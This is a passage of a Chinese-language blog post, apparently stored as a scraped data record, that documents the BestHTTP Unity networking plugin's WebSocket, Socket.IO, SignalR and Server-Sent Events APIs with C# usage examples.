ClientFunctionImplementation(Hub hub, MethodCallMessage msg) \n                { \n                // TODO: implement \n                } \n                // 包装函数调用服务器端函数.\n                public void ServerFunction(string argument) \n                { \n                        base.Call(\"ServerFunction\", argument); \n                } \n        }\n        //可以实例化此SampleHub并将其传递给Connection的构造函数：\n        SampleHub sampleHub = new SampleHub(); Connection signalRConnection = new Connection(Uri, sampleHub); \n\n ```\n\n * 8:Authentication\n Connection类具有AuthenticationProvider属性，可以将其设置为实现IAuthenticationProvider接口的对象,实现者必须实现以下属性和功能\n >>>\n        ● bool IsPreAuthRequired：如果在Connection类向服务器发出任何请求之前必须运行身份验证，则返回true的属性。示例：cookie身份验证器必须返回false，因为它必须发送用户凭据并接收必须随请求一起发送的cookie。 \n        ● StartAuthentication：仅在IsPreAuthRequired为true时才需要的函数。否则它不会被调用。 \n        ● PrepareRequest：使用请求和请求类型枚举调用的函数。此函数可用于在将请求发送到服务器之前准备。 \n        ● OnAuthenticationSucceded：IsPreAuthRequired为true且身份验证过程成功时必须调用的事件。 \n        ● OnAuthenticationFailed：IsPreAuthRequired为true且身份验证过程失败时必须调用的事件。\n >>>\n 一个非常简单的基于Header的身份验证器看起来像这样：\n ```\n        class HeaderAuthenticator : IAuthenticationProvider \n        { \n                public string User { get; private set; } \n                public string Roles { get; private set; } \n                // 此类身份验证不需要预先验证步骤\n                public bool IsPreAuthRequired { get { return false; } } \n                //未使用的事件，因为IsPreAuthRequired为false \n                public event OnAuthenticationSuccededDelegate OnAuthenticationSucceded; \n                //未使用的事件，因为IsPreAuthRequired为false\n                public event OnAuthenticationFailedDelegate OnAuthenticationFailed; \n                // 使用用户名和角色初始化身份验证器的构造函数.\n                public HeaderAuthenticator(string  user, string roles) \n                { \n                        this.User = user; this.Roles = roles; \n                } \n                //未使用的事件，因为IsPreAuthRequired为false             \n                public void StartAuthentication() { } \n                // 通过向其添加两个标头来准备请求\n                public void PrepareRequest(BestHTTP.HTTPRequest request, RequestTypes type) \n                { \n                        request.SetHeader(\"username\", this.User); request.SetHeader(\"roles\", this.Roles); \n                }\n        }\n ```\n 与Socket.IO的Manager类一样，SignalR的Connection类具有JsonEncoder属性，也可以设置静态Connection.DefaultEncoder。 JsonEncoder必须从BestHTTP.SignalR.JsonEncoders命名空间实现IJsonEncoder接口。该软件包包含一个LitJsonEncoder示例，也可用于某些示例\n\n ## Server-Sent Events\n\n* 1:Server-Sent Events是一种基于字符串的单向协议。数据来自服务器，没有选项可以向服务器发送任何内容。它是使用最新的草案实现的。虽然协议的名称是Server-Sent Events，但类本身名为EventSource,发生错误时，一旦发送LastEventId，插件将尝试重新连接，让服务器发送任何我们应该收到的缓冲消息\n```\n        //The EventSource class \n        //EventSource类位于BestHTTP.ServerSentEvents命名空间中：\n        using BestHTTP.ServerSentEvents; \n        var sse = new EventSource(new Uri(\"http://server.com\")); \n```\n* 2:Properties,这些是EventSource类的公开公开属性：\n>>>\n        ● Uri：这是协议尝试连接的端点。它是通过构造函数设置的。 \n        ● State：EventSource对象的当前状态。 \n        ● ReconnectionTime：等待尝试重新连接尝试的时间。它的默认值是2秒。 \n        ● LastEventId：最后收到的事件的id。如果没有收到任何事件ID，它将为null。 \n        ● InternalRequest：将在Open函数中发送的内部HTTPRequest对象。\n>>>\n\n* 3:事件\n```\n        //OnOpen：成功升级协议时调用它\n        eventSource.OnOpen += OnEventSourceOpened; \n        void OnEventSourceOpened(EventSource source) { Debug.log(\"EventSource Opened!\"); } \n\n        //OnMessage：当客户端从服务器收到新消息时调用它。此函数将接收一个Message对象，该对象包含Data属性中消息的有效内容。每次客户端收到消息时都会调用此事件，即使消息具有有效的事件名称，我们也为此事件分配了一个事件处理程序！\n        eventSource.OnMessage += OnEventSourceMessage;\n        void OnEventSourceMessage(EventSource source, Message msg) { Debug.log(\"Message: \" + msg.Data); }\n\n        // OnError：在连接到服务器或处理数据流时遇到错误时调用\n        eventSource.OnError += OnEventSourceError; \n        void OnEventSourceError(EventSource source, string error) { Debug.log(\"Error: \" + error); }\n\n        //OnRetry：在插件尝试重新连接到服务器之前调用此函数。如果函数返回false，则不会进行任何尝试，并且将关闭EventSource。\n        eventSource.OnRetry += OnEventSourceRetry; \n        bool OnEventSourceRetry(EventSource source) { // disable retry return false; }\n\n        //OnClosed：当EventSource关闭时，将调用此事件。\n        eventSource.OnClosed += OnEventSourceClosed; \n        void OnEventSourceClosed(EventSource source) { Debug.log(\"EventSource Closed!\"); } \n\n        //OnStateChanged：每次State属性更改时调用。\n        eventSource.OnStateChanged += OnEventSourceStateChanged; \n        void OnEventSourceStateChanged(EventSource source, States oldState, States newState) { Debug.log(string.Format(\"State Changed {0} => {1}\", oldSate, newState))); }\n```\n\n* 4:Functions,这些是EventSource对象的公共函数。\n```\n        //Open: 调用此函数，插件将开始连接到服务器并升级到Server-Sent Events协议。\n        EventSource eventSource = new EventSource(new Uri(\"http://server.com\")); \n        eventSource.Open(); \n\n        // On:使用此功能，客户端可以订阅事件\n        eventSource.On(\"userLogon\", OnUserLoggedIn); \n        void OnUserLoggedIn(EventSource source, Message msg) { Debug.log(msg.Data); }\n\n        //Off:它可用于取消订阅活动。\n        eventSource.Off(\"userLogon\"); \n\n        //Close: 此函数将开始关闭EventSource对象。\n        eventSource.Close(); \n```\n* 5:Message,Message类是一个逻辑单元，包含服务器可以发送的所有信息,Properties:\n>>>\n     ● Id：已发送事件的ID。如果没有发送id，则可以为null。它被插件使用。 \n     ● 事件：事件的名称。如果没有发送事件名称，则可以为null。 \n     ● 数据：消息的实际有效负载。 \n     ● 重试：服务器发送插件在重新连接尝试之前应等待的时间。它被插件使用。\n>>>\n\n## 简单例子\n● Upload a picture using forms \n```\n        var request = new HTTPRequest(new Uri(\"http://server.com\"), HTTPMethods.Post, onFinished); \n        request.AddBinaryData(\"image\", texture.EncodeToPNG(), \"image.png\"); \n        request.Send(); \n```\n● Upload a picture without forms, sending only the raw data \n```\n        var request = new HTTPRequest(new Uri(\"http://server.com\"), HTTPMethods.Post, onFinished); \n        request.SetHeader(\"Content-Type\", \"image/png\"); \n        request.Raw = texture.EncodeToPNG(); \n        request.Send(); \n```\n● Add custom header \n```\n        var request = new HTTPRequest(new Uri(\"http://server.com\"), HTTPMethods.Post, onFinished); \n        request.SetHeader(\"Content-Type\", \"application/json; charset=UTF-8\"); \n        request.RawData = UTF8Encoding.GetBytes(ToJson(data)); \n        request.Send(); \n```\n● Display  download progress \n```\n        var request = new HTTPRequest(new Uri(\"http://serveroflargefile.net/path\"), (req, resp) => { Debug.Log(\"Finished!\"); }); \n        request.OnProgress += (req, down, length) => Debug.Log(string.Format(\"Progress: {0:P2}\", down / (float)length)); \n        request.Send(); \n```\n● Abort a request \n```\n        var request = new HTTPRequest(new Uri(address), (req, resp) => { // State should be HTTPRequestStates.Aborted if we call Abort() before // it’s finishes Debug.Log(req.State); }); \n        request.Send(); \n        request.Abort();\n```\n● 可恢复下载的范围请求,第一个请求是获取服务器功能的Head请求。当支持范围请求时，将调用DownloadCallback函数。在这个函数中，我们将创建一个新的实际请求来获取内容的块，并将回调函数设置为此函数。当前下载位置保存到PlayerPrefs，因此即使在应用程序重新启动后也可以恢复下载。\n```\n        private const int ChunkSize = 1024 * 1024; // 1 MiB - should be bigger! \n        private string saveTo = \"downloaded.bin\"; \n        void StartDownload(string url) \n        {\n        var headRequest = new HTTPRequest(new Uri(url), HTTPMethods.Head, (request, response) => \n        {\n                if (response == null) Debug.LogError(\"Response null. Server unreachable? Try again later.\"); \n                else {\n                        if (response.StatusCode == 416) Debug.LogError(\"Requested range not satisfiable\"); else if (response.StatusCode == 200) \n                        Debug.LogError(\"Partial content doesn't supported by the server, content can be downloaded as a whole.\"); \n                        else if (response.HasHeaderWithValue(\"accept-ranges\",\"none\")) Debug.LogError(\"Server doesn't supports the 'Range' header! The file can't be downloaded in parts.\"); \n                        else DownloadCallback(request, response);         \n                }\n        }  \n        // Range header for our head request \n        int startPos = PlayerPrefs.GetInt(\"LastDownloadPosition\",0); \n        headRequest.SetRangeHeader(startPos, startPos + ChunkSize); \n        headRequest.DisableCache = true; headRequest.Send(); \n        } \n\n        void DownloadCallback(HTTPRequest request, HTTPResponse response) \n        {\n                if (response == null) { Debug.LogError(\"Response null. Server unreachable, or connection lost? Try again later.\"); return; } var range = response.GetRange(); \n                if (range == null) { Debug.LogError(\"No 'Content-Range' header returned from the server!\"); return; } \n                else if (!range.IsValid) { Debug.LogError(\"No valid 'Content-Range' header returned from the server!\"); return; } \n                if (request.MethodType != HTTPMethods.Head) \n                { \n                        string path = Path.Combine(Application.temporaryCachePath,saveTo); \n                        using (FileStream fs = new FileStream(path, FileMode.Append)) fs.Write(response.Data, 0, response.Data.Length); \n                        PlayerPrefs.SetInt(\"LastDownloadPosition\", range.LastBytePos); \n                        Debug.LogWarning(string.Format(\"Download Status: {0}-{1}/{2}\", range.FirstBytePos, range.LastBytePos, range.ContentLength)); \n                        if (range.LastBytePos == range.ContentLength - 1) { Debug.LogWarning(\"Download finished!\"); return; } \n                }\n                var downloadRequest = new HTTPRequest(request.Uri, HTTPMethods.Get, /*isKeepAlive:*/ true, DownloadCallback); \n                int nextPos = 0; \n                if (request.MethodType != HTTPMethods.Head) nextPos = range.LastBytePos + 1; else nextPos = PlayerPrefs.GetInt(\"LastDownloadPosition\", 0);\n                downloadRequest.SetRangeHeader(nextPos, nextPos + ChunkSize); \n                downloadRequest.DisableCache = true;    \n                downloadRequest.Send(); \n        } \n\n```\n\n## 其他\n\n* 1:禁用功能\n>>>\n        ●BESTHTTP_DISABLE_COOKIES：使用此定义可以禁用所有与cookie相关的代码。不会进行cookie解析，保存和发送。 \n        ●BESTHTTP_DISABLE_CACHING：使用此定义可以禁用所有与缓存相关的代码。不会进行缓存或缓存验证。 \n        ●BESTHTTP_DISABLE_SERVERSENT_EVENTS：可以使用此功能禁用服务器发送的事件。 SignalR不会回退到此。 \n        ●BESTHTTP_DISABLE_WEBSOCKET：可以使用此禁用Websocket。 SignalR和Socket.IO不会使用此协议。 \n        ●BESTHTTP_DISABLE_SIGNALR：将禁用整个SignalR实施。 \n        ●BESTHTTP_DISABLE_SIGNALR_CORE：将禁用SignalR Core实施。 \n        ●BESTHTTP_DISABLE_SOCKETIO：将禁用整个Socket.IO实现。 \n        ●BESTHTTP_DISABLE_ALTERNATE_SSL：如果您没有为WebSocket使用HTTPS或WSS，或者您对默认实现感到满意，则可以禁用备用ssl处理程序。 \n        ●BESTHTTP_DISABLE_UNITY_FORM：您可以删除对Unity的WWWForm的依赖。\n>>>\n* 2:支持的平台\n>>>\n        ● WebGL\n        ● iOS\n        ● Android\n        ● Windows Phone 10\n        ● WinRT / Metro / Windows应用商店应用8.1,10•Windows，Linux和Mac独立版\n>>>\n* 3:在Android，iOS和桌面平台上.net的Net SslStream用于HTTPS。这可以处理各种证书，但有些证书可能会失败。要提供备用解决方案BouncyCastle捆绑在插件中，您可以通过在HTTPRequest对象上将UseAlternateSSL设置为true来使用它。但它也可能在一些认证上失败。在Windows Phone 8.1（及更高版本）和WinRT（Windows应用商店应用程序）上，安全的Tls 1.2协议将处理连接。\n\n","source":"_posts/Unity/BestHttp/WebSocket.md","raw":"---\ntitle: BestHttp介绍2\ndate: 2020-05-11 11:41:32\ncategories:\n- Unity\ntags:\n- BestHttp\n---\n\n# WebSocket\n\n## 介绍\n* 1:我们可以通过WebSocket类使用WebSocket功能。我们只需要将服务器的Uri传递给WebSocket的构造函数\n\n* 2:创建\n\n\n```\n        var webSocket = new WebSocket(new Uri(\"wss://html5labs-interop.cloudapp.net/echo\")); \n\n```\n* 3:,OnOpen事件：在建立与服务器的连接时调用。在此事件回调之后，WebSocket的IsOpen属性将为True，直到我们或服务器关闭连接或发生错误。\n\n```\n        webSocket.OnOpen += OnWebSocketOpen; \n        private void OnWebSocketOpen(WebSocket webSocket) { Debug.Log(\"WebSocket Open!\"); }\n```\n\n\n* 4:,OnMessage事件：从服务器收到文本消息时调用。\n\n```\n        webSocket.OnMessage += OnMessageReceived; \n        private void OnMessageReceived(WebSocket webSocket, string message) { Debug.Log(\"Text Message received from server: \" + message); } \n\n```\n\n\n* 5:,OnBinary事件：从服务器收到二进制blob消息时调用。\n\n\n```\n        webSocket.OnBinary += OnBinaryMessageReceived; \n        private void OnBinaryMessageReceived(WebSocket webSocket, byte[] message) { Debug.Log(\"Binary Message received from server. Length: \" + message.Length); }\n\n```\n\n\n* 6:,OnClosed事件：在客户端或服务器关闭连接时调用，或发生内部错误。当客户端通过Close函数关闭连接时，它可以提供代码和消息，指示关闭的原因。服务器通常会回复我们的代码和消息。\n\n\n```\n        webSocket.OnClosed += OnWebSocketClosed; \n        private void OnWebSocketClosed(WebSocket webSocket, UInt16 code, string message) { Debug.Log(\"WebSocket Closed!\");}\n\n```\n\n\n* 7:OnError事件：当我们无法连接到服务器时调用，发生内部错误或连接丢失。第二个参数是Exception对象，但它可以为null。在这种情况下，检查WebSocket的InternalRequest应该告诉更多有关该问题的信息。\n\n\n```\n        webSocket.OnError += OnError; \n        private void OnError(WebSocket ws, Exception ex) \n        { \n                string errorMsg = string .Empty; \n                if (ws.InternalRequest.Response != null)\n                {\n                        errorMsg = string.Format(\"Status Code from Server: {0} and Message: {1}\", ws.InternalRequest.Response.StatusCode, ws.InternalRequest.Response.Message); \n                }\n                Debug.Log(\"An error occured: \" + (ex != null ? ex.Message : \"Unknown: \" + errorMsg)); \n        } \n\n```\n\n\n* 8:OnErrorDesc事件：一个更具信息性的事件，此事件在OnError事件之后调用,因为后者仅使用Exception参数调用。但它可以提供更详细的错误报告。\n\n\n```\n        webSocket.OnErrorDesc += OnErrorDesc; \n        void OnErrorDesc(WebSocket ws, string error) { Debug.Log(\"Error: \" + error); } \n\n```\n\n\n* 9:在我们将所有事件注册完备之后，我们可以开始连接：\n\n```\n        webSocket.Open(); \n\n```\n\n\n在此步骤之后，我们将收到一个OnOpen事件的回调，我们可以开始向服务器发送消息。\n\n\n```\n        // 发送字符串: \n        webSocket.Send(\"Message to the Server\"); \n\n        // 创建二进制流,并填充: \n        byte[] buffer = new byte[length]; \n        //发送二进制流 \n        webSocket.Send(buffer); \n\n```\n\n完成通信后/不需要的时候,关闭链接,无法重用已关闭的WebSocket实例。\n\n```\n        webSocket.Close(); \n\n```\n* 10:Ping消息：通过在收到OnOpen事件之前将StartPingThread属性设置为True，可以启动新线程将Ping消息发送到服务器。这样，Ping消息将定期发送到服务器。可以在PingFrequency属性中设置两次ping之间的延迟（默认值为1000ms）.(相当于设置心跳包)\n* 11:Pong消息：从插件服务器收到的所有ping消息将自动生成Pong应答。\n* 12:Streaming：较长的文本或二进制消息将变得支离破碎。默认情况下，这些片段由插件自动组装。如果我们向WebSocket的OnIncompleteFrame事件注册事件处理程序，则可以覆盖此机制。每次客户端收到不完整的片段时都会调用此事件。这些片段将被插件忽略，它不会尝试组装这些片段，也不会存储它们。此事件可用于实现流式传输体验。(自定义组装消息).\n\n## 使用Socket.IO\n* 1:Socket.IO实现使用插件已有的功能。当轮询传输与其所有功能（cookie，连接重用等）一起使用时，它将发送HTTPRequests以获取握手数据，发送和接收数据包。 WebSocket实现用于WebSocket传输\n>>>\n        1):易于使用和熟悉的api\n        2):兼容最新的Socket.IO规范\n        3):从轮询传输到websocket传输的无缝升级\n        4):断开时自动重新连接\n        5):简单高效的二进制数据发送和多种接收方式\n        6):在高级模式下使用它的强大工具（切换默认编码器，禁用自动解码等）\n>>>\n* 2:使用.如果要连接到Socket.IO服务，可以使用BestHTTP.SocketIO.SocketManager类来完成。首先，您必须创建一个SocketManager实例\n\n```\n        using System; using BestHTTP; \n        using BestHTTP.SocketIO; \n        var manager = new SocketManager(new Uri(\"http://chat.socket.io/socket.io/\")); \n```\n\n* 3:Url中的/socket.io/路径非常重要，默认情况下，Socket.IO服务器将侦听此查询。所以不要忘记测试！\n* 4:Connecting to namespaces ,默认情况下，SocketManager将在连接到服务器时连接到根（“/”）命名空间。您可以通过SocketManager的Socket属性访问它：\n\n```\n        Socket root = manager.Socket; \n```\n\n可以通过GetSocket（'/ nspName'）函数或通过manager的indexer属性访问非默认名称空间：\n\n```\n        Socket nsp = manager[\"/customNamespace\"]; \n        // 等价于: \n        Socket nsp = manager.GetSocket(\"/customNamespace\"); \n```\n\n\n首次访问命名空间将启动内部连接过程\n* 4:Subscribing  and receiving events ,您可以订阅预定义和自定义事件。预定义事件是“连接”，“连接”，“事件”，“断开连接”，“重新连接”，“重新连接”，“重新连接”，“重新连接失败”，“错误”。(\"connect\", \"connecting\", \"event\", \"disconnect\", \"reconnect\", \"reconnecting\", \"reconnect_attempt\", \"reconnect_failed\", \"error\". )自定义事件是程序员定义的事件，服务器将发送给您的客户端。您可以通过调用套接字的On函数来订阅事件：\n```\n        manager.Socket.On(\"login\", OnLogin); \n        manager.Socket.On(\"new message\", OnNewMessage); \n\n        void OnLogin(Socket socket, Packet packet, params object[] args) \n        { \n                //Socket参数将是服务器发送此事件的namespace-socket对象\n                //Packet参数包含事件的内部分组数据。数据包可用于访问服务器发送的二进制数据，或使用自定义Json解析器lib解码有效负载数据。稍后会详细介绍。\n                //Args参数是一个可变长度数组，包含来自数据包有效负载数据的解码对象。使用默认的Json编码器，这些参数可以是“原始”类型（int，double，string）或对象列表（List对象）或Dictionary字符串，对象对象。\n        } \n\n```\n```\n        //服务器上面的代码写法,在一个 node.js 的服务器上面\n        socket.emit('message', ‘MyNick’, ‘Msg to the client’); \n        //客户端接收\n        // subscribe to the \"message\" event \n        manager.Socket.On(\"message\", OnMessage); \n        // event handler \n        void OnMessage(Socket socket, Packet packet, params object[] args) \n        { \n                // args[0] is the nick of the sender \n                // args[1] is the message \n                Debug.Log(string.Format(\"Message from {0}: {1}\", args[0], args[1])); \n        } \n\n```\n>>>\n        ●“connect”：命名空间打开时发送。 \n        ●“connecting”：当SocketManager开始连接到socket.io服务器时发送。 \n        ●“event”：在自定义（程序员定义的）事件上发送。 \n        ●“disconnect”：当传输断开，SocketManager关闭，Socket关闭或在握手数据中指定的给定时间内没有从服务器收到Pong消息时发送。 \n        ●“reconnect”：插件成功重新连接到socket.io服务器时发送。 \n        ●“reconnecting”：当插件尝试重新连接到socket.io服务器时发送。 \n        ●“reconnect_attempt”：当插件尝试重新连接到socket.io服务器时发送。 \n        ●“reconnect_failed”：重新连接尝试无法连接到服务器并且ReconnectAttempt达到选项“ReconnectionAttempts”值时发送。 \n        ●“error”：在服务器或内部插件错误上发送。事件的唯一参数是BestHTTP.SocketIO.Error对象。\n        ● Once：您可以订阅仅被调用一次的事件。manager.Socket.Once(\"connect\", OnConnected); \n        ● Off:您可以删除所有活动订阅，或只删除一个\n        // 删除所有的回调事件\n        manager.Socket.Off(); \n        //从\"connect\"事件中删除所有回调\n        manager.Socket.Off(\"connect\"); \n        //从\"connect\"事件中删除OnConnected回调\n        manager.Socket.Off(\"connect\", OnConnected); \n>>>\n\n* 5:Sending events ,您可以使用“Emit”功能发送事件。您必须将事件名称作为第一个参数和可选的其他参数传递。这些将被编码为json并将被发送到服务器。您可以选择设置一个回调函数，该函数将在服务器处理事件时被调用（您必须正确设置服务器代码才能发回回调函数。有关更多信息，请参阅Socket.IO服务器端文档）。\n```\n        // 发送携带 2 个参数的事件给服务器\n        manager.Socket.Emit(\"message\", \"userName\", \"message\"); \n\n        // 发送携带 2 个参数的并有回调事件的事件给服务器\n        manager.Socket.Emit(\"custom event\", OnAckCallback, \"param 1\", \"param 2\"); \n        void OnAckCallback(Socket socket, Packet originalPacket, params object[] args) { Debug.Log(\"OnAckCallback!\"); } \n```\n您可以通过调用套接字的EmitAck函数向服务器发回确认。您必须传递原始数据包和任何可选数据,您可以保留对数据包的引用，并从其他位置调用EmitAck:\n```\n        manager[\"/customNamespace\"].On(\"customEvent\", (socket, packet, args) => { socket.EmitAck(packet, \"Event\", \"Received\", \"Successfully\"); }); \n```\n* 6:发送二进制数据有 2 种方法\n1):通过传递给Emit函数，插件将扫描参数，如果找到参数，它将把它转换为二进制附件（如Socket.IO 1.0中所介绍的）。这是最有效的方法，因为它不会将字节数组转换为客户端的Base64编码字符串，并在服务器端转换为二进制。\n```\n        byte[] data = new byte[10]; \n        manager.Socket.Emit(\"eventWithBinary\", \"textual param\", data); \n```\n2):如果二进制数据作为字段或属性嵌入对象中，则Json编码器必须支持转换。默认的Json编码器无法将嵌入的二进制数据转换为Json，您必须使用更高级的Json解析器库（如'JSON .NET For Unity' - http://u3d.as/5q2）\n* 7:接收二进制数据\n在Socket.IO服务器中，当二进制数据发送到客户端时，它将用Json对象（{'_ placeholder'：true，'num'：xyz}）替换数据，并将二进制数据发送到另一个数据包中。在客户端，这些数据包将被收集并合并到一个数据包中。二进制数据将位于数据包的Attachments属性中。\n1):在这里你也可以选择使用这个数据包：\n在事件处理程序中，您可以通过数据包的Attachments属性访问所有二进制数据,autoDecodePayload默认为 true\n```\n        Socket.On(\"frame\", OnFrame); \n        void OnFrame(Socket socket, Packet packet, params object[] args) { texture.LoadImage(packet.Attachments[0]); }\n```\n2):第二个选项与前一个选项几乎相同，略有改进：我们不会将发送的Json字符串解码为c＃对象。我们可以这样做，因为我们知道服务器只发送了二进制数据，此事件没有其他信息。因此，我们将让插件知道不解码有效负载\n```\n        //订阅“frame”事件，并将autoDecodePayload标志设置为false,不让插件自动解码\n        Socket.On(\"frame\", OnFrame, /*autoDecodePayload:*/ false); \n        void OnFrame(Socket socket, Packet packet, params object[] args) { texture.LoadImage(packet.Attachments[0]); } \n\n```\n3):我们可以将'{'_placeholder'：true，'num'：xyz}'字符串替换为附件列表中附件的索引。\n```\n        Socket.On(\"frame\", OnFrame, /*autoDecodePayload:*/ false); \n        void OnFrame(Socket socket, Packet packet, params object[] args) \n        { \n                //用索引替换Json对象\n                packet.ReconstructAttachmentAsIndex(); \n                // 现在，将Payload解码为 object[]\n                args = packet.Decode(socket.Manager.Encoder); \n                // args现在只包含一个索引号（可能为0） \n                byte[] data = packet.Attachments[Convert.ToInt32(args[0])]; texture.LoadImage(data); \n        } \n```\n4):我们可以用附件中转换为Base64编码字符串的二进制数据替换'{'_ placeholder'：true，'num'：xyz}'字符串。当高级Json解析器必须将其设置为对象的字段或属性时，它可以将其转换为字节数组\n```\n        Socket.On(\"frame\", OnFrame, /*autoDecodePayload:*/ false); \n        void OnFrame(Socket socket, Packet packet, params object[] args) \n        { \n                // 用Base64编码的字符串替换Json对象 packet.ReconstructAttachmentAsBase64(); \n                // 现在，将Payload解码为object[]\n                args = packet.Decode(socket.Manager.Encoder); \n                // args现在包含一个Base64编码的字符串\n                byte[] data = Convert.FromBase64String(args[0] as string); texture.LoadImage(data); \n        }\n```\n* 8:设置默认的Json编码器, 您可以通过将SocketManager的静态DefaultEncoder设置为新的编码器来更改默认的Json编码器。在此步骤之后，所有新创建的SocketManager将使用此编码器。或者，您可以直接将SocketManager对象的Encoder属性设置为编码器。\n编写自定义Json编码器:如果由于各种原因想要更改默认的Json编码器，首先必须编写一个新的Json编码器。为此，您必须编写一个新类，该类从BestHTTP.SocketIO.JsonEncoders命名空间实现IJsonEncoder。剥离的IJsonEncoder非常小，你必须只实现两个功能：\n```\n        public interface IJsonEncoder \n        { \n                List<object> Decode(string json); \n                string Encode(List<object> obj); \n        } \n```\nDecode函数必须将给定的json字符串解码为对象列表。由于Socket.IO协议的性质，发送的json是一个数组，第一个元素是事件的名称。Encode函数用于编码客户端要发送给服务器的数据。此列表的结构与Decode相同：列表的第一个元素是事件的名称，任何其他元素是用户发送的参数。例子:\n```\n        using LitJson; \n        public sealed class LitJsonEncoder : IJsonEncoder \n        { \n                public List<object> Decode(string json) \n                { \n                        JsonReader reader = new JsonReader(json); \n                        return JsonMapper.ToObject<List<object>>(reader); \n                } \n                public string Encode(List<object> obj) \n                { \n                        JsonWriter writer = new JsonWriter(); \n                        JsonMapper.ToJson(obj, writer); \n                        return writer.ToString(); \n                } \n        } \n```\n\n* 9:AutoDecodePayload属性,\n已经在“接收二进制数据”中讨论过AutoDecodePayload，但是您不仅可以按event设置此值，还可以设置每个socket的值。socket具有AutoDecodePayload属性，该属性用作事件订阅的默认值。其默认值为true - 所有Payload都已解码并分派给事件订阅者。如果设置为false，插件将不进行解码，您必须自己完成。\n你不想每次都抛出args：当然！您可以在Socket对象上设置AutoDecodePayload，并且可以使用您喜欢的Json解析器将Packet的Payload解码为强类型对象。但请记住，Payload将包含事件的名称，它是一个json数组。示例Payload如下所示：'['eventName'，{'field'：'stringValue'}，{'field'：1.0}]'。\n\n* 10:Error handling  发生服务器端或客户端错误时发出“错误”事件。事件的第一个参数是Error对象。这将包含Code属性中的错误代码和Message属性中的字符串消息。此类中的ToString（）函数已被重写，您可以使用此函数写出其内容。\n```\n        Socket.On(SocketIOEventTypes.Error, OnError); \n        void OnError(Socket socket, Packet packet, params object[] args) \n        { \n                Error error = args[0] as Error; \n                switch (error.Code) \n                { \n                        case SocketIOErrors.User: \n                                Debug.Log(\"Exception in an event handler!\"); \n                        break; \n                        case SocketIOErrors.Internal: \n                                Debug.Log(\"Internal error!\"); \n                        break; \n                        default: \n                                Debug.Log(\"Server error!\"); break; \n                } \n                Debug.Log(error.ToString()); \n        } \n```\n\n* 11:SocketOptions类中的可用选项,您可以将SocketOptions实例传递给SocketManager的构造函数。您可以更改以下选项：\n>>>\n        1):Reconnection：断开连接后是否自动重新连接。其默认值为true\n        2):ReconnectionAttempts：放弃前的尝试次数。它的默认值是Int.MaxValu\n        3):ReconnectionDelay：在尝试重新连接之前最初等待的时间。受+/- RandomizationFactor影响。例如，默认初始延迟将在500ms到1500ms之间。其默认值为10000毫秒。\n        4):ReconnectionDelayMax：重新连接之间等待的最长时间。如上所述，每次尝试都会增加重新连接延迟以及随机化。其默认值为5000毫秒。\n        5):RandomizationFactor：它可用于控制ReconnectionDelay范围。其默认值为0.5，可以在0..1值之间设置\n        6)Timeout:发出“connect_error”和“connect_timeout”事件之前的连接超时。它不是底层tcp套接字的连接超时，而是socket.io协议。其默认值为20000ms\n        7):AutoConnect：通过将此设置为false，您必须在决定适当时调用SocketManager的Open（）。\n        8):ConnectWith：So​​cketManager将尝试连接到此属性的传输集。它可以是TransportTypes.Polling或TransportTypes.WebSocket\n>>>\n\n# SignalR\n* 1:像Socket.IO这样的SignalR实现使用了插件的基本功能。 HTTPRequests和WebSockets用于连接和通信连接池。 Cookie随请求一起发送，记录器用于记录有关协议和错误的信息,SignalR实现的功能简要列表：\n>>>\n        1):兼容最新的SignalR服务器实现\n        2):好用的 API\n        3):传输回调\n        4):重新连接逻辑\n        5):支持所有Hub功能\n>>>\n```\n        using BestHTTP.SignalR;\n        Uri uri = new Uri(\"http://besthttpsignalr.azurewebsites.net/raw-connection/\");\n        //通过仅将服务器的uri传递给构造函数来创建没有集线器的连接。\n        Connection signalRConnection = new Connection(uri); \n        //通过将集线器名称传递给构造函数来创建与集线器的连接。\n        Connection signalRConnection = new Connection(uri, \"hub1\", \"hub2\", \"hubN\"); \n        //通过将Hub对象传递给构造函数来创建与Hub的连接。\n        Hub hub1 = new Hub(\"hub1\"); \n        Hub hub2 = new Hub(\"hub2\"); \n        Hub hubN = new Hub(\"hubN\"); \n        Connection signalRConnection = new Connection(uri, hub1, hub2, hubN); \n        //创建Connection之后，我们可以通过调用Open（）函数开始连接到服务器\n        signalRConnection.Open(); \n```\n* 2:Handling general events Connection类允许您订阅多个事件。这些事件如下：\n```\n        //OnConnected：当连接类成功连接并且SignalR协议用于通信时，将触发此事件。\n        signalRConnection.OnConnected += (con) => Debug.Log(\"Connected to the SignalR server!\"); \n\n        //OnClosed：当SignalR协议关闭时，将触发此事件，并且不再发送或接收更多消息。\n        signalRConnection.OnClosed += (con) => Debug.Log(\"Connection Closed\"); \n        //OnError：发生错误时调用。如果连接已打开，插件将尝试重新连接，否则连接将关闭。\n        signalRConnection.OnError += (conn, err) => Debug.Log(\"Error: \" + err); \n\n        //OnReconnecting：启动重新连接尝试时会触发此事件。在此事件之后，将调用OnError或OnReconnected事件。可以在OnReconnected / OnClosed事件之前触发多个OnReconnecting-OnError事件对，因为插件将尝试在给定时间内多次重新连接。\n        signalRConnection.OnReconnecting += (con) => Debug.Log(\"Reconnecting\"); \n\n        //OnReconnected：重新连接尝试成功时触发。\n        signalRConnection.OnReconnecting += (con) => Debug.Log(\"Reconnected\"); \n        //OnStateChnaged：连接状态发生变化时触发。事件处理程序将同时接收旧状态和新状态。\n        signalRConnection.OnStateChanged += (conn, oldState, newState) => Debug.Log(string.Format(\"State Changed {0} -> {1}\", oldState, newState)); \n\n        //OnNonHubMessage：当服务器向客户端发送非集线器消息时触发。客户端应该知道服务器期望的消息类型，并且应该相应地转换接收的对象。\n        signalRConnection.OnNonHubMessage + =（con，data）= Debug.Log（'来自服务器的消息：'+ data.ToString（））;\n\n        //RequestPreparator：为每个发出并将发送到服务器的HTTPRequest调用此委托。它可用于进一步自定义请求。\n        signalRConnection.RequestPreparator = (con, req, type) => req.Timeout = TimeSpan.FromSeconds(30); \n\n```\n\n* 3:Sending non-Hub  messages \n```\n        //将非集线器消息发送到服务器很容易，因为调用连接对象上的函数：\n        signalRConnection.Send(new { Type = \"Broadcast\", Value = \"Hello SignalR World!\" }); \n\n        //此函数将使用Connection的JsonEncoder将给定对象编码为Json字符串，并将其发送到服务器。已编码的Json字符串可以使用SendJson函数发送\n        signalRConnection.SendJson(\"{ Type: ‘Broadcast’, Value: ‘Hello SignalR World!’ }\"); \n```\n\n* 4:Hubs,为了在客户端上定义Hub可以从服务器调用的方法，并调用a上的方法\n服务器上的集线器必须将集线器添加到Connection对象。这可以通过将集线器名称或集线器实例添加到Connection构造函数来完成，在“连接类”部分中进行了演示\n```\n        